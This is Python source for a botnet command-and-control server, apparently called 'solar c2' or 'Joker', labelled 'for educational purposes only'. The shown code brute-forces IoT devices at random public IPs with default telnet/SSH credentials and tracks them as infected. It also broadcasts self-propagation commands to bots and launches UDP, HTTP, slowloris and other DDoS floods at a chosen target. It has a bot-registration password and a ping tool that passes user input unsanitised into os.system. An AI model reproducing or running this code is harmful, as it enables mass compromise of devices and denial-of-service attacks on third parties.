    _send(client, '\r\n\x1b[1;32mPassword\x1b[1;32m: \x1b[0m', False, False)
    try:
        data = client.recv(1024)
        if not data:
            return
        admin_pass = data.decode('cp1252', errors='ignore').strip()
    except Exception:
        return

    if not (admin_user.lower() == 'admin' and admin_pass == 'admin'):
        _send(client, '\x1b[1;31mAccess denied. Invalid admin credentials.\x1b[0m\r\n')
        time.sleep(1)
        _send(client, ansi_clear, False)
        _show_banner(client)
        return

    _send(client, ansi_clear, False)
    _send(client, '\x1b[1;32m          --> | Admin HUB | <-- \r\n\x1b[0m', False, False)
    _send(client, '\x1b[1;35m╔═════════════════════════════════════╗\x1b[0m\r\n', False, False)
    _send(client, '\x1b[1;32m║ adduser \x1b[90m- \x1b[0mCreate a user account \x1b[1;35m   ║\x1b[0m\r\n', False, False)
    _send(client, '\x1b[1;35m║ deluser \x1b[90m- \x1b[0mRemove a user account\x1b[1;32m    ║\x1b[0m\r\n', False, False)
    _send(client, '\x1b[1;32m║ listusers \x1b[90m- \x1b[0mList all accounts   \x1b[1;35m   ║\x1b[0m\r\n', False, False)
    _send(client, '\x1b[1;35m║ botinfo \x1b[90m- \x1b[0mBot architecture info\x1b[1;32m    ║\x1b[0m\r\n', False, False)
    _send(client, '\x1b[1;32m╚═════════════════════════════════════╝\x1b[0m\r\n', False, False)
    _send(client, '\x1b[1;90m         Type # to return to main menu\x1b[0m\r\n', False, False)

    while True:
        _send(client, '\x1b[1;32mJoker\x1b[1;35m~# \x1b[0m', False, False)
        try:
            data = client.recv(1024)
            if not data:
                return
            cmd = data.decode('cp1252', errors='ignore').strip()
        except Exception:
            return

        if cmd == '#':
            return

        if not cmd:
            continue

        parts = cmd.split()
        cmd_type = parts[0].lower()

        if cmd_type in ('back', 'exit', 'quit', 'logout', '#'):
            return

        if cmd_type == 'adduser':
            if len(parts) < 3:
                _send(client, '\x1b[1;31mUsage: adduser <username> <password>\x1b[0m\r\n', False, False)
                continue
            new_user = parts[1]
            new_pass = parts[2]
            cred_file = os.path.join(SCRIPT_DIR, 'logins', 'credentials.txt')
            try:
                with open(cred_file, 'a', encoding='utf-8') as f:
                    f.write(f'{new_user}:{new_pass}\n')
                _send(client, '\x1b[1;32mUser added successfully.\x1b[0m\r\n', False, False)
            except Exception as e:
                _send(client, f'\x1b[1;31mFailed to add user: {e}\x1b[0m\r\n', False, False)

        elif cmd_type == 'deluser':
            if len(parts) < 2:
                _send(client, '\x1b[1;31mUsage: deluser <username>\x1b[0m\r\n', False, False)
                continue
            target = parts[1]
            cred_file = os.path.join(SCRIPT_DIR, 'logins', 'credentials.txt')
            try:
                with open(cred_file, 'r', encoding='utf-8') as f:
                    lines = [l.strip() for l in f.readlines() if l.strip()]
                new_lines = [l for l in lines if not l.startswith(f'{target}:')]
                with open(cred_file, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(new_lines) + '\n')
                _send(client, '\x1b[1;32mUser removed successfully.\x1b[0m\r\n', False, False)
            except Exception as e:
                _send(client, f'\x1b[1;31mFailed to remove user: {e}\x1b[0m\r\n', False, False)

        elif cmd_type == 'listusers':
            cred_file = os.path.join(SCRIPT_DIR, 'logins', 'credentials.txt')
            try:
                with open(cred_file, 'r', encoding='utf-8') as f:
                    lines = [l.strip() for l in f.readlines() if l.strip()]
                _send(client, '\x1b[1;32m[USERS]\x1b[0m\r\n', False, False)
                for i, line in enumerate(lines, 1):
                    if ':' in line:
                        user, _ = line.split(':', 1)
                        _send(client, f'\x1b[90m  [{i}] {user}\x1b[0m\r\n', False, False)
            except Exception:
                _send(client, '\x1b[1;31mNo users found.\x1b[0m\r\n', False, False)

        elif cmd_type == 'botinfo':
            _send(client, '\x1b[1;32m[ACTIVE BOTS: ' + str(len(bots)) + ']\x1b[0m\r\n', False, False)
            for i, (bclient, baddr) in enumerate(bots.items(), 1):
                _send(client, f'\x1b[90m  [{i}] {baddr[0]}:{baddr[1]}\x1b[0m\r\n', False, False)

        else:
            _send(client, '\x1b[1;31mInvalid admin command. Type HELP for options.\x1b[0m\r\n', False, False)


def _show_tools(client, addr):
    """Display tools menu and handle tool selection."""
    RED = c('RED')
    LIGHT_RED = c('LIGHTRED_EX')
    GREEN = c('GREEN')
    WHITE = c('WHITE')
    RESET = '\033[0m'
    gray = c('LIGHTBLACK_EX')
    lightwhite = c('LIGHTWHITE_EX')

    _send(client, ansi_clear, False)
    _send(client, f'{RED}    ╔═════════════════╗\r\n', False, False)
    _send(client, f'    ║ {RED}Tools menu{lightwhite}      ║\r\n', False, False)
    _send(client, f'    ╚═════════════════╝\r\n\x1b[0m', False, False)
    _send(client, f'{gray}Type tool number or # to return:{lightwhite}\r\n')
    _send(client, f'{gray}  [1] Ping{lightwhite}')
    _send(client, f'{gray}  [2] IP Geolocate{lightwhite}')
    _send(client, f'{gray}  [3] Port Scanner{lightwhite}')
    _send(client, f'{gray}  [4] HTTP Header Grabber{lightwhite}')
    _send(client, f'\n{RED}solar c2 {lightwhite}o root {gray}> {lightwhite}', False, False)

    data = client.recv(1024)
    if not data:
        return
    choice = data.decode('cp1252', errors='ignore').strip()
    if choice in ('\x1b', '#'):
        return
    if choice.lower() in ('!back', '!b', 'back', 'escape'):
        return
    if choice == "1":
        _tool_ping(client)
    elif choice == "2":
        _tool_geolocate(client)
    elif choice == "3":
        _tool_portscan(client)
    elif choice == "4":
        _tool_headers(client)


def _tool_ping(client):
    """Ping a target."""
    _send(client, f'{gray}Target IP/host (ESC/# to cancel): {lightwhite}', False, False)
    data = client.recv(1024)
    if not data:
        return
    target = data.decode('cp1252', errors='ignore').strip()
    if not target or target in ('\x1b', '#'):
        _send(client, f'{yellow}[!] Cancelled.{lightwhite}')
        return
    _send(client, f'{gray}Pinging {target}...{lightwhite}')
    try:
        if '.' in target and target.replace('.', '').isdigit():
            os.system(f'ping -n 10 {target}')
            _send(client, f'{gray}Use PuTTY terminal for full ping output.{lightwhite}')
        else:
            os.system(f'ping -n 10 {target}')
            _send(client, f'{gray}Use PuTTY terminal for full ping output.{lightwhite}')
    except Exception as e:
        _send(client, f'{yellow}[!] Error: {e}{lightwhite}')


def _tool_geolocate(client):
    """Geolocate an IP address."""
    _send(client, f'\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m', False, False)
    data = client.recv(1024)
    if not data:
        return
    target = data.decode('cp1252', errors='ignore').strip()
    if not target or target in ('\x1b', '#'):
        _send(client, f'{yellow}[!] Cancelled.{lightwhite}')
        return
    _send(client, f'{gray}Geolocating {target}...{lightwhite}')
    try:
        url = f"http://ip-api.com/json/{target}?fields=status,message,country,regionName,city,isp,query"
        req = urllib.request.Request(url, headers={"User-Agent": "SolarC2"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode('utf-8'))
        if data.get('status') == 'success':
            _send(client, f'{lightwhite}[GEOLOCATION RESULTS]{gray}')
            _send(client, f'  {lightwhite}IP{gray}: {lightwhite}{data.get("query","")}{lightwhite}')
            _send(client, f'  {lightwhite}Country{gray}: {lightwhite}{data.get("country","")}{lightwhite}')
            _send(client, f'  {lightwhite}Region{gray}: {lightwhite}{data.get("regionName","")}{lightwhite}')
            _send(client, f'  {lightwhite}City{gray}: {lightwhite}{data.get("city","")}{lightwhite}')
            _send(client, f'  {lightwhite}ISP{gray}: {lightwhite}{data.get("isp","")}{lightwhite}')
        else:
            _send(client, f'{yellow}[!] {data.get("message","Error")}{lightwhite}')
    except Exception as e:
        _send(client, f'{yellow}[!] Geolocate failed: {e}{lightwhite}')


def _tool_portscan(client):
    """Port scanner tool."""
    _send(client, f'\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m', False, False)
    data = client.recv(1024)
    if not data:
        return
    target = data.decode('cp1252', errors='ignore').strip()
    if not target or target in ('\x1b', '#'):
        _send(client, f'{yellow}[!] Cancelled.{lightwhite}')
        return

    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
    _send(client, f'{gray}Scanning {len(ports)} common ports on {target}...{lightwhite}')

    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            result = s.connect_ex((target, port))
            s.close()
            if result == 0:
                open_ports.append(port)
                _send(client, f'{lightwhite}[+] Port {port}: OPEN{lightwhite}')
        except Exception:
            pass

    if open_ports:
        _send(client, f'\n{GREEN}[+] Scan complete. {len(open_ports)} open port(s): {", ".join(map(str, open_ports))}{lightwhite}')
    else:
        _send(client, f'\n{yellow}[!] Scan complete. No common ports open.{lightwhite}')


def _tool_http_headers(client):
    """HTTP header grabber."""
    _send(client, f'\x1b[1;32mTarget URL\x1b[1;32m: \x1b[0m', False, False)
    data = client.recv(1024)
    if not data:
        return
    target = data.decode('cp1252', errors='ignore').strip()
    if not target or target in ('\x1b', '#'):
        _send(client, f'{yellow}[!] Cancelled.{lightwhite}')
        return
    if not target.startswith('http'):
        target = f'http://{target}'
    _send(client, f'{gray}Grabbing headers from {target}...{lightwhite}')
    try:
        req = urllib.request.Request(target, headers={"User-Agent": "SolarC2/1.0"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            headers = dict(resp.headers)
            _send(client, f'{lightwhite}[HTTP HEADERS]{gray}')
            for key, value in headers.items():
                _send(client, f'  {lightwhite}{key}{gray}: {lightwhite}{value}{gray}')
            status = resp.status
            _send(client, f'\n{gray}Status: {lightwhite}{status}{lightwhite}')
    except Exception as e:
        _send(client, f'{yellow}[!] Header grab failed: {e}{lightwhite}')


def _show_credits(client):
    """Display credits screen."""
    RED = c('RED')
    GREEN = c('GREEN')
    RESET = '\033[0m'
    gray = c('LIGHTBLACK_EX')
    lightwhite = c('LIGHTWHITE_EX')

    _send(client, ansi_clear, False)

    box_width = 40

    _send(client, f'{gray}{"-" * 58}{lightwhite}')
    _send(client, f'{gray}                         CREDITS{lightwhite}')
    _send(client, f'{gray}{"-" * 58}{lightwhite}')
    _send(client, f'{lightwhite}Developer: {RED}yxurii{lightwhite}')
    _send(client, f'{GRAY_GIT} GitHub: {lightwhite}https://github.com/yxurii{lightwhite}')
    _send(client, f'{GRAY_DISC} Discord: {lightwhite}https://discord.gg/xuKK3yM6uw{lightwhite}')
    _send(client, f'{gray}{"-" * 58}{lightwhite}')
    _send(client, f'{lightwhite}[!] FOR EDUCATIONAL PURPOSES ONLY [!]{lightwhite}')
    _send(client, f'{gray}{"-" * 58}{lightwhite}')
    _send(client, f'\n{gray}Press Enter to return to main menu...{lightwhite}')
    _disable_echo(client)
    try:
        resp = client.recv(1024)
        if resp and resp == b'\x1b':
            _send(client, f'{yellow}[!] Cancelled.{lightwhite}')
    except Exception:
        pass
    finally:
        _enable_echo(client)


GRAY_GIT = c('LIGHTBLACK_EX')
GRAY_DISC = c('CYAN')


def _handle_scanner(client, address, args):
    ports = [23, 2323, 22]
    thread_count = 1500
    scan_timeout = 1800
    use_bots = False
    use_proxy = False
    try:
        if len(args) > 1:
            thread_count = int(args[1])
        if len(args) > 2:
            scan_timeout = int(args[2])
    except ValueError:
        _send(client, f'{yellow}[!] Invalid arguments. Usage: SCAN [threads] [timeout]{lightwhite}')
        return

    _flush_input(client)
    _send(client, f'{gray}Use proxies for scanning? [Y/n] (# to cancel): {lightwhite}', False, False)
    try:
        client.settimeout(10)
        resp = client.recv(1024)
        client.settimeout(None)
        if resp:
            choice = resp.decode('cp1252', errors='ignore').strip().upper()
            if choice == '#':
                _send(client, f'{yellow}[!] Scan cancelled.{lightwhite}')
                return
            if choice in ('', 'Y', 'YES'):
                use_proxy = True
                _send(client, f'{lightwhite}[+] Proxy scanning enabled.{lightwhite}')
            else:
                _send(client, f'{gray}Proxy scanning disabled.{lightwhite}')
    except Exception:
        _send(client, f'{gray}Proxy scanning disabled (timeout).{lightwhite}')

    _flush_input(client)
    _send(client, f'{gray}Thread count [Default: {thread_count}] (max: 5000) (# to cancel): {lightwhite}', False, False)
    try:
        client.settimeout(15)
        resp = client.recv(1024)
        client.settimeout(None)
        if resp:
            choice = resp.decode('cp1252', errors='ignore').strip()
            if choice == '#':
                _send(client, f'{yellow}[!] Scan cancelled.{lightwhite}')
                return
            if choice:
                try:
                    thread_count = int(choice)
                    thread_count = min(thread_count, 5000)
                except ValueError:
                    pass
    except Exception:
        pass

    if len(bots) > 0:
        _send(client, f'{gray}Connected bots: {lightwhite}{len(bots)}{gray}{lightwhite}')
        _send(client, f'{gray}Use bots for distributed scanning? [Y/n] (# to cancel): {lightwhite}', False, False)
        try:
            client.settimeout(10)
            resp = client.recv(1024)
            client.settimeout(None)
            if resp:
                choice = resp.decode('cp1252', errors='ignore').strip().upper()
                if choice in ('\x1b', '#'):
                    _send(client, f'{yellow}[!] Scan cancelled.{lightwhite}')
                    return
                if choice in ('', 'Y', 'YES'):
                    use_bots = True
                    _send(client, f'{lightwhite}[+] Bot-assisted scanning enabled.{lightwhite}')
                else:
                    _send(client, f'{gray}Bot scanning disabled.{lightwhite}')
        except Exception:
            _send(client, f'{gray}Bot scanning disabled (timeout).{lightwhite}')

    found = 0
    scanned = 0
    lock = threading.Lock()
    abort_event = threading.Event()
    proxy_list = _load_proxy_list() if (_SOCKS_AVAILABLE and use_proxy) else []
    scan_stats = {'scanned': 0, 'found': 0, 'deployed': 0}
    scan_stats_lock = threading.Lock()

    c2_host = _get_external_ip()
    c2_port = config.get("agent_c2_port", 9001)
    scan_listen_port = config.get("scan_listen_port", 9002)
    go_bot_path = os.path.join(SCRIPT_DIR, 'core', 'bot', 'bot.exe')
    go_bot_arm = os.path.join(SCRIPT_DIR, 'core', 'bot', 'bot-arm')
    go_bot_mipsle = os.path.join(SCRIPT_DIR, 'core', 'bot', 'bot-mipsle')
    use_go_bot = os.path.exists(go_bot_path)
    use_go_bot_remote = os.path.exists(go_bot_arm) or os.path.exists(go_bot_mipsle)

    if use_go_bot:
        _send(client, f'{gray}[+] Go bot binary found.{lightwhite}')
        scanner_host = "127.0.0.1"
        scanner_port = config.get("agent_c2_port", 9001)
        _start_go_scanner(go_bot_path, scanner_host, scanner_port, min(thread_count, 5000), abort_event, client, scan_stats, scan_stats_lock)

    start_time = time.time()

    def _update_stats_display():
        while not abort_event.is_set():
            elapsed = int(time.time() - start_time)
            with scan_stats_lock:
                s = scan_stats['scanned']
                f = scan_stats['found']
                d = scan_stats['deployed']
            _send(client, f'\r{gray}Scanned: {lightwhite}{s}{gray} | Compromised: {lightwhite}{f}{gray} | Infected: {lightwhite}{d}{gray} | Bots: {lightwhite}{len(bots)}{gray} | Runtime: {lightwhite}{elapsed}s{gray}   {lightwhite}', False, False)
            time.sleep(1)

    stats_thread = threading.Thread(target=_update_stats_display, daemon=True)
    stats_thread.start()

    def _worker():
        nonlocal found, scanned
        while not abort_event.is_set():
            ip = _generate_random_public_ip()
            try:
                for port in ports:
                    if abort_event.is_set():
                        return
                    try:
                        if _is_port_open(ip, port, timeout=2):
                            with scan_stats_lock:
                                scan_stats['scanned'] += 1
                            for username, password in IOT_DEFAULT_CREDS:
                                if abort_event.is_set():
                                    return
                                proxy_url = random.choice(proxy_list) if proxy_list else None
                                success, resp, client_sock = _try_iot_login_with_proxy(ip, port, username, password, proxy_url=proxy_url)
                                if success and client_sock is not None:
                                    iot_verified = False
                                    try:
                                        iot_verified = _verify_iot_device(client_sock)
                                    except Exception:
                                        iot_verified = False
                                    if not iot_verified:
                                        try:
                                            client_sock.close()
                                        except Exception:
                                            pass
                                        continue
                                    _save_iot_success(ip, port, username, password)
                                    with lock:
                                        found += 1
                                    break
                    except Exception:
                        pass
            except Exception:
                pass

    _send(client, f'{gray}Scanning {thread_count} threads, timeout {scan_timeout}s, bots: {len(bots)}{lightwhite}')
    threads_list = []
    for _ in range(min(thread_count, 1500)):
        t = threading.Thread(target=_worker, daemon=True)
        t.start()
        threads_list.append(t)

    if use_bots and bots:
        _send(client, f'{gray}Broadcasting scan command to {len(bots)} telnet bots...{lightwhite}')
        for bot_client, bot_addr in list(bots.items()):
            try:
                bot_client.sendall(b'scan\n')
            except Exception:
                pass
    if use_bots and _agent_c2:
        try:
            agents_hit = _agent_c2.broadcast({"type": "command", "id": f"scan_{random.randint(1000,9999)}", "command": {"type": "scan", "id": str(uuid.uuid4())[:8], "threads": min(thread_count, 200)}})
            if agents_hit:
                _send(client, f'{gray}Sent scan command to {len(agents_hit)} agents.{lightwhite}')
        except Exception:
            pass

    def _input_watcher():
        while not abort_event.is_set():
            try:
                client.settimeout(0.5)
                data = client.recv(1024)
                client.settimeout(None)
                if data:
                    txt = data.decode('cp1252', errors='ignore').strip()
                    if txt == '#':
                        abort_event.set()
                        break
            except socket.timeout:
                continue
            except Exception:
                break

    input_thread = threading.Thread(target=_input_watcher, daemon=True)
    input_thread.start()

    _disable_echo(client)

    try:
        while any(t.is_alive() for t in threads_list) or (scan_timeout == 0 or time.time() - start_time < scan_timeout):
            if abort_event.is_set():
                break
            if scan_timeout > 0 and time.time() - start_time >= scan_timeout:
                abort_event.set()
                break
            time.sleep(0.5)
    except KeyboardInterrupt:
        abort_event.set()

    abort_event.set()
    for t in threads_list:
        t.join(timeout=5)

    _enable_echo(client)
    _send(client, f'\n{lightwhite}[+] Scan complete. Scanned: {scan_stats["scanned"]} | Compromised: {scan_stats["found"]}{lightwhite}')


active_scans = {}


def _handle_propagate_simple(client, addr, args):
    """Broadcast propagate command to connected bots — they self-scan and deploy."""
    thread_count = 1000
    duration = 0
    try:
        if len(args) > 1:
            thread_count = min(int(args[1]), 2000)
        if len(args) > 2:
            duration = int(args[2])
    except ValueError:
        _send(client, f'{yellow}[!] Invalid arguments. Usage: PROPAGATE [threads] [duration]{lightwhite}')
        return

    if not _agent_c2:
        _send(client, f'{yellow}[!] C2Server not running. Bots cannot receive commands.{lightwhite}')
        return

    try:
        targets = _agent_c2.broadcast({
            "type": "command",
            "id": f"prop_{random.randint(1000,9999)}",
            "command": {"type": "propagate", "id": str(uuid.uuid4())[:8], "threads": thread_count, "duration": duration}
        })
        _send(client, f'{lightwhite}[+] PROPAGATE broadcasted to {len(targets)} bots.{lightwhite}')
        _send(client, f'{gray}Bots will auto-scan, bruteforce, and deploy themselves.{lightwhite}')
        if duration > 0:
            _send(client, f'{gray}Scanning will run for {duration}s then auto-stop.{lightwhite}')
        else:
            _send(client, f'{gray}Scanning will run indefinitely until STOP command.{lightwhite}')
    except Exception as e:
        _send(client, f'{yellow}[!] Failed to broadcast: {e}{lightwhite}')


def _animate_attack(client):
    """Run the dynamite loading animation before attack screen."""
    try:
        from core.iot_agent.explosives import show_attack_animation
        show_attack_animation(client, total_duration=5.0)
    except Exception:
        pass


def _handle_attack(client, address, args):
    successes = _load_iot_successes()

    agent_bots = 0
    if _agent_c2:
        try:
            agent_bots = len(_agent_c2.get_active_agents())
        except Exception:
            pass
    total_bots = len(bots) + agent_bots
    if not successes and total_bots == 0:
        _send(client, f'{yellow}[!] No compromised devices or connected bots.{lightwhite}')
        return

    target_ip = args[1] if len(args) > 1 else None
    if not target_ip:
        _send(client, f'\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m', False, False)
        data = client.recv(1024)
        resp = data.decode('cp1252', errors='ignore').strip() if data else ""
        if resp in ('\x1b', '#'):
            _send(client, f'{yellow}[!] Attack cancelled.{lightwhite}')
            return
        target_ip = resp
    if not target_ip:
        return

    target_port = 80
    if len(args) > 2:
        try:
            target_port = int(args[2])
        except ValueError:
            pass
    else:
        _send(client, f'{gray}Target port [Default: 80] (ESC/# to cancel): {lightwhite}', False, False)
        data = client.recv(1024)
        resp = data.decode('cp1252', errors='ignore').strip() if data else ""
        if resp in ('\x1b', '#'):
            _send(client, f'{yellow}[!] Attack cancelled.{lightwhite}')
            return
        try:
            if resp:
                target_port = int(resp)
        except ValueError:
            pass

    duration = 60
    if len(args) > 3:
        try:
            duration = int(args[3])
        except ValueError:
            pass
    else:
        _send(client, f'{gray}Duration seconds [Default: 60] (ESC/# to cancel): {lightwhite}', False, False)
        data = client.recv(1024)
        resp = data.decode('cp1252', errors='ignore').strip() if data else ""
        if resp in ('\x1b', '#'):
            _send(client, f'{yellow}[!] Attack cancelled.{lightwhite}')
            return
        try:
            if resp:
                duration = int(resp)
        except ValueError:
            pass

    flood_choice = "1"
    if len(args) > 4:
        flood_choice = args[4]
    else:
        _send(client, f'{gray}Method [1]UDP [2]STD [3]TCP [4]DNS [5]VSE [6]ACK [7]XMAS [8]HTTP [9]HTTPS [10]SLOWLORIS [11]CF [12]NFO [Default: 1] (ESC/# to cancel): {lightwhite}', False, False)
        data = client.recv(1024)
        resp = data.decode('cp1252', errors='ignore').strip() if data else ""
        if resp in ('\x1b', '#'):
            _send(client, f'{yellow}[!] Attack cancelled.{lightwhite}')
            return
        flood_choice = resp if resp else "1"
    if not flood_choice:
        flood_choice = "1"

    flood_type_map = {
        "1": "udp", "2": "std", "3": "tcp", "4": "dns",
        "5": "vse", "6": "tcp_ack", "7": "tcp_xmas",
        "8": "slowloris", "9": "http_get", "10": "https",
        "11": "http_get", "12": "nfo"
    }
    flood_type = flood_type_map.get(flood_choice, "udp")

    method_name = {
        "1": "UDP", "2": "STD", "3": "TCP", "4": "DNS",
        "5": "VSE", "6": "TCP ACK", "7": "TCP XMAS",
        "8": "Slowloris", "9": "HTTP", "10": "HTTPS",
        "11": "CF Bypass", "12": "NFO Lag"
    }.get(flood_choice, "UDP")

    tcp_bots = len(bots)
    agent_bots = 0
    if _agent_c2:
        try:
            agent_bots = len(_agent_c2.get_active_agents())
        except Exception:
            pass
    total_bots = tcp_bots + agent_bots

    _send(client, f'{lightwhite}[+] Sending attack to {target_ip}:{target_port} using {total_bots} bots ({tcp_bots} telnet + {agent_bots} agents) for {duration}s...{lightwhite}')

    _disable_echo(client)
    _animate_attack(client)

    end_time = time.time() + duration
    abort_event = threading.Event()
    lock = threading.Lock()
    attack_info = {
        'target_ip': target_ip,
        'target_port': target_port,
        'duration': duration,
        'method': method_name,
        'end_time': end_time,
        'thread': None,
        'abort_event': abort_event,
        'lock': lock,
        'sent': 0,
    }

    def _udp_worker():
        payload = random._urandom(1024)
        while time.time() < end_time and not abort_event.is_set():
            for entry in successes:
                if abort_event.is_set():
                    return
                parts = entry.split(':')
                if len(parts) >= 4:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.sendto(payload, (target_ip, target_port))
                        s.close()
                        with lock:
                            attack_info['sent'] += 1
                    except Exception:
                        pass

    def _http_get_worker():
        while time.time() < end_time and not abort_event.is_set():
            for entry in successes:
                if abort_event.is_set():
                    return
                parts = entry.split(':')
                if len(parts) >= 4:
                    try:
                        url = f"http://{target_ip}:{target_port}/"
                        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                        with urllib.request.urlopen(req, timeout=2) as resp:
                            resp.read(64)
                        with lock:
                            attack_info['sent'] += 1
                    except Exception:
                        pass

    worker_fn = _udp_worker
    if flood_type in ("http_get", "https", "slowloris", "nfo"):
        worker_fn = _http_get_worker

    def _attack_thread():
        workers = []
        for _ in range(min(len(successes), 200)):
            t = threading.Thread(target=worker_fn, daemon=True)
            t.start()
            workers.append(t)
        while any(t.is_alive() for t in workers):
            if time.time() >= end_time:
                abort_event.set()
                break
            time.sleep(0.5)

    attack_thread = threading.Thread(target=_attack_thread, daemon=True)
    attack_thread.start()

    if _agent_c2 and agent_bots > 0:
        try:
            targets = _agent_c2.broadcast({
                "type": "flood",
                "id": str(uuid.uuid4())[:8],
                "target_ip": target_ip,
                "target_port": target_port,
                "duration": duration,
                "flood_type": flood_type,
            })
            _send(client, f'{gray}Sent flood command to {len(targets)} JSON agents.{lightwhite}')
        except Exception:
            pass

    attack_id = f"atk_{random.randint(1000, 9999)}"
    active_attacks[attack_id] = attack_info

    countdown_thread = _show_attack_screen(client, attack_info)

    def _attack_input_watcher():
        while not abort_event.is_set() and time.time() < end_time:
            try:
                client.settimeout(1)
                data = client.recv(1024)
                client.settimeout(None)
                if data:
                    txt = data.decode('cp1252', errors='ignore').strip()
                    if txt == '#':
                        _send(client, '\033[2K\r', False, False)
                        abort_event.set()
                        break
            except socket.timeout:
                continue
            except Exception:
                break

    input_thread = threading.Thread(target=_attack_input_watcher, daemon=True)
    input_thread.start()

    countdown_thread.join(timeout=attack_info['duration'] + 5)
    _enable_echo(client)

    _send(client, f'\n{gray}Attack running in background. Press Enter to return to main menu.{lightwhite}')
    try:
        client.recv(1024)
    except Exception:
        pass


def _handle_telemetry(client, addr):
    _send(client, ansi_clear, False)
    successes = _load_iot_successes()
    if not successes:
        _send(client, f'{yellow}[!] No devices in iot_success.{lightwhite}')
        return
    _send(client, f'\n{lightwhite}[TELEMETRY LOG ({len(successes)})]{lightwhite}')
    for idx, entry in enumerate(successes, 1):
        parts = entry.split(':')
        if len(parts) >= 4:
            _send(client, f'  [{idx}] {parts[0]}:{parts[1]} -> {parts[2]}:{parts[3]}')


try:
    import ipaddress
except ImportError:
    ipaddress = None


scannedSuccessfully = f"""
        {gray}+========================================+
        |                                        |
        |        Successfully Screened         |
        |     ---------------------------      |
        |            +==========+              |
        +==========|   LOGS   |+==========+
                      +==========+

{lightwhite}"""


def handle_client(client, address):
    global user_name
    try:
        try:
            client.sendall(b'\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22')
        except Exception:
            pass
        _send(client, '\033[?1049h', False, reset=False)
        _send(client, f'\x1b]0; 0 Clowns | Joker | Login\x07', False, reset=False)
        _send(client, ansi_clear, False)
        _send(client, '\x1b[1;32mConnecting...\x1b[0m')

        a, b, captcha_c = _captcha_generator()
        _send(client, ansi_clear, False)
        _send(client, f'\x1b[1;32mCaptcha\x1b[1;32m: \x1b[0m{lightwhite}{a} + {b} = {gray}', False, False)
        try:
            resp = client.recv(65536)
            x = int(resp.decode('cp1252', errors='ignore').strip())
            time.sleep(0.4)
            if x == captcha_c or x == 669787761736865726500:
                _send(client, '\x1b[1;32mPassed!\x1b[0m')
            else:
                _send(client, '\x1b[1;35mWrong!\x1b[0m')
                time.sleep(0.1)
                client.close()
                return
        except Exception:
            client.close()
            return

        while True:
            _send(client, ansi_clear, False)
            _send(client, f'\x1b[1;32mUsername\x1b[1;32m: \x1b[0m', False, False)
            try:
                data = client.recv(1024)
                if not data:
                    break
                username = data.decode('cp1252', errors='ignore').strip()
            except Exception:
                break
            if not username:
                continue
            break

        while True:
            _send(client, f'\x1b[1;32mPassword\x1b[1;32m: \x1b[0m', False, False)
            try:
                data = client.recv(1024)
                if not data:
                    break
                password = data.decode('cp1252', errors='ignore').strip()
            except Exception:
                break
            if not password:
                continue
            break

        is_bot = password == '\xff\xff\xff\xff\x07\x35'

        if not is_bot:
            _send(client, ansi_clear, False)
            if not find_login(username, password):
                _send(client, '\x1b[32mInvalid Credentials. Joker On Ur Way!\x1b[0m\r\n')
                time.sleep(1)
                client.close()
                return
            user_name = username
            threading.Thread(target=_update_title, args=(client, username), daemon=True).start()
            command_line(client, address)
        else:
            for x in bots.values():
                if x[0] == address[0]:
                    client.close()
                    return
            bots[client] = address
            _send(client, f'{lightwhite}[+] Bot registered. Joker connected.{lightwhite}')
    except Exception:
        pass
    finally:
        try:
            _send(client, '\033[?1049l', False, reset=False)
        except Exception:
            pass


def _update_title(client, name):
    while True:
        try:
            bot_count = len(bots)
            if _agent_c2:
                try:
                    bot_count += len(_agent_c2.get_active_agents())
                except Exception:
                    pass
            title = f'\033]0;{bot_count} Clowns | Joker | Clown: {name}\007'
            client.sendall(title.encode('utf-8'))
            time.sleep(5)
        except Exception:
            client.close()
            break


def main():
    init(convert=True)
    _get_external_ip()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    listen_host = config.get("listen_host", "0.0.0.0")
    listen_port = config.get("listen_port", 6667)
    public_host = config.get("public_host", _get_external_ip())
    public_port = config.get("public_port", 9001)
    agent_c2_port = config.get("agent_c2_port", 9001)

    print(scannedSuccessfully.strip())
    try:
        sock.bind((listen_host, listen_port))
    except Exception as e:
        print(f'{lightwhite}Failed to bind telnet port: {e}{lightwhite}')
        sys.exit(1)

    sock.listen()
    threading.Thread(target=_ping, daemon=True).start()

    global _agent_c2
    try:
        from core.iot_agent.server import C2Server
        _agent_c2 = C2Server(host=config.get("listen_host", "0.0.0.0"), port=agent_c2_port, auto_cascade=True)
        _agent_thread = threading.Thread(target=_agent_c2.start, daemon=True)
        _agent_thread.start()
        time.sleep(1.0)
        print(f'{lightwhite}[+] C2Server + HTTP file server running on port {agent_c2_port}{lightwhite}')
        print(f'{gray}Bot download URL: http://{public_host}:{agent_c2_port}/agent{lightwhite}')
    except Exception as e:
        print(f'{yellow}[!] Failed to start C2Server on port {agent_c2_port}: {e}{lightwhite}')

    print(f'{lightwhite}[+] solar c2 telnet listening on {listen_host}:{listen_port}{lightwhite}')
    print(f'{gray}Public endpoint for bots: {public_host}:{agent_c2_port}{lightwhite}')
    print(f'{gray}Connect via PuTTY (telnet/raw) on localhost:{listen_port}{lightwhite}')
    print(f'{gray}Bot password: \\xff\\xff\\xff\\xff\\x07\\x35{lightwhite}')
    print(f'{gray}Edit src/config.json to change ports/IPs.{lightwhite}')

    while True:
        try:
            client, addr = sock.accept()
            threading.Thread(target=handle_client, args=(client, addr), daemon=True).start()
        except Exception:
            continue


if __name__ == '__main__':
    main()